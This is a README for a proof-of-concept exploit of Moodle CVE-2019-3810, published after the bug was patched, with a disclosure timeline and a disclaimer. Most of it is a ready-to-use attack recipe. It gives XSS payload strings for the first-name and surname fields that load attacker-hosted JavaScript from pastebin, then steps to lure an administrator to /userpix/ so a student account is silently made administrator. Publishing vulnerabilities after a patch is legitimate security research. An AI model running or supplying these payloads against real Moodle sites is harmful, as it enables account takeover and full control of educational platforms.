# Moodle CVE-2019-3810

Moodle (< 3.6.2, < 3.5.4, < 3.4.7, < 3.1.16) XSS PoC for Privilege Escalation (Student to Admin). This is one of the past bugs that I discovered during past pentest in an academic institution. It was successful enough at the time to practically steal admin access and gain complete control over Moodle using just one simple bug.

We can see from [the git history](https://github.com/moodle/moodle/blame/785e29e954f601a4f8d406aa0f3c9dba001d5018/userpix/index.php#L16), the bug existed since old versions of Moodle (2003) and [just patched in 2019](https://github.com/moodle/moodle/commit/14f9bad3cebf1aa6bb73be48020653e1f792dc29).

Timeline:
- December 2018 - Reported the bug to Moodle
- January 2019 - Patch released
- April 2021 - PoC disclosure

## WARNING

FOR EDUCATIONAL PURPOSES ONLY. DO NOT USE THE EXPLOIT FOR ILLEGAL ACTIVITIES. THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE.

## PoC

1. Upload the [payload.js](payload.js) to pastebin or other similar service. Change the value of `userid` to your own id. Let's say the URL is `https://pastebin.com/raw/xxxxxxxx`.
2. Login to your student account.
3. Set first name with `" style="position:fixed;height:100%;width:100%;top:0;left:0" onmouseover="x=document.createElement`
4. Set surname with `('script');x.src='https://pastebin.com/raw/xxxxxxxx';document.body.appendChild(x); alert('XSS')`
5. Ask the administrator to open `/userpix/` page or put the link to that page on your post and wait.

If successful, your account will be added as administrator.

[Demonstration video](moodle-xss-privilege-escalation.mp4)
